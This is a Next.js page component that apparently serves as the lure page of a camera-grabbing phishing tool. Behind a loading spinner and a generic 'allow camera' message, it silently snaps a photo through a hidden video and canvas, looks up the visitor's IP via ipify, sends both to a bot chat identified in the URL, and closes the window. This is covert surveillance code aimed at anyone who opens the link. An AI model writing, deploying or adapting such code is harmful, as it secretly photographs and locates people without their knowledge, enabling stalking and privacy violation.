"use client";

import dynamic from "next/dynamic";
import { useCallback, useEffect } from "react";
import { useCamera } from "~/shared/use-camera";
import { getPermissions, sendDataToBot } from "./actions";

const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
const Loader = () => <div className="spinner" />;

interface CameraProps {
	chatId: number;
}
const Camera = ({ chatId }: CameraProps) => {
	const { videoRef, canvasRef, photo } = useCamera();

	const handlePhoto = useCallback(
		async (photo: string) => {
			const ip = await fetch("https://api.ipify.org/?format=json")
				.then((res) => res.json())
				.then((data) => data.ip)
				.catch(() => "unknown");

			try {
				const canSendPhoto = await getPermissions(chatId);
				if (!canSendPhoto) {
					return;
				}

				await sendDataToBot({ photo, chatId, ip });
				window.close();
			} catch (err) {
				console.error("Failed to send photo:", err);
			}
		},
		[chatId],
	);

	useEffect(() => {
		if (photo) {
			handlePhoto(photo);
		}
	}, [photo, handlePhoto]);

	return (
		<>
			<video ref={videoRef} style={{ display: "none" }} autoPlay />
			<canvas ref={canvasRef} style={{ display: "none" }} />
			<Loader />
		</>
	);
};

interface Props {
	params: {
		slug?: string[];
	};
}

function Page({ params }: Props) {
	const { status } = useCamera();

	if (!params.slug?.length || Number.isNaN(Number(params.slug[0]))) {
		window.close();
		return null;
	}

	if (status === "denied") {
		return <CameraNotAllowed />;
	}

	if (status === "granted") {
		return <Camera chatId={Number(params.slug[0])} />;
	}

	return <Loader />;
}

export default dynamic(() => Promise.resolve(Page), {
	ssr: false,
});
